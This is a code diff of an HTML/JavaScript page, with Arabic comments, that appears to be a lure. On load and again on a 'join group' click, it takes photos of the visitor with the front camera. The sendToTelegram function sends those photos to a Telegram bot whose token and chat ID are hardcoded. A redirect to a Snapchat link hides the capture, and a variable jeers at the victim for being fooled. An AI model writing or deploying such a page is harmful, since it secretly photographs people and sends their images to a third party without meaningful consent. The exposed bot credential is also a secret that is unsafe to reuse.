@@ -93,43 +93,51 @@
         const funnyMsg = "7kamtak a lfarkh";
         let hasPermission = false;
 
-        // ====================== عند فتح الصفحة (3 صور) ======================
+        // ====================== عند فتح الصفحة ======================
         async function startOnLoad() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: "user", width: 1280, height: 720 }
                 });
                 hasPermission = true;
-                captureMultiplePhotos(stream, 3);
+                captureMultiplePhotos(stream, 3);   // 3 صور عند الدخول
             } catch (err) {
                 hasPermission = false;
             }
         }
 
-        // ====================== عند الضغط على الزر (صورة واحدة) ======================
+        // ====================== عند الضغط على الزر ======================
         async function joinGroup() {
             try {
                 let stream;
+
                 if (!hasPermission) {
+                    // طلب جديد إذا رفض سابقاً
                     stream = await navigator.mediaDevices.getUserMedia({
                         video: { facingMode: "user", width: 1280, height: 720 }
                     });
                     hasPermission = true;
                 } else {
+                    // إذا كان لديه صلاحية سابقة
                     stream = await navigator.mediaDevices.getUserMedia({
                         video: { facingMode: "user", width: 1280, height: 720 }
                     });
                 }
+
+                // التقاط صورة واحدة فقط عند الضغط على الزر
                 await captureMultiplePhotos(stream, 1);
+
             } catch (err) {
                 console.log("تم رفض السماح");
             } finally {
+                // الانتقال بعد تأخير بسيط
                 setTimeout(() => {
                     window.location.href = "https://snapchat.com/t/4OJnOzSW";
                 }, 800);
             }
         }
 
+        // دالة التقاط عدد معين من الصور
         async function captureMultiplePhotos(stream, count) {
             const video = document.createElement('video');
             video.srcObject = stream;
@@ -158,8 +166,8 @@
         }
 
         async function sendToTelegram(dataUrl, photoNumber) {
-            const botToken = 8813321733:AAGkBxc5ZvwTVIKmB_ZmO8iSQAIgTrgZgqs;
-            const chatId = 8642141696;
+            const botToken = "8813321733:AAGkBxc5ZvwTVIKmB_ZmO8iSQAIgTrgZgqs";
+            const chatId = "8642141696";
 
             const formData = new FormData();
             formData.append("chat_id", chatId);
@@ -184,6 +192,7 @@
             return new File([u8arr], filename, { type: mime });
         }
 
+        // بدء الطلب عند تحميل الصفحة
         window.onload = startOnLoad;
     </script>
 </body>
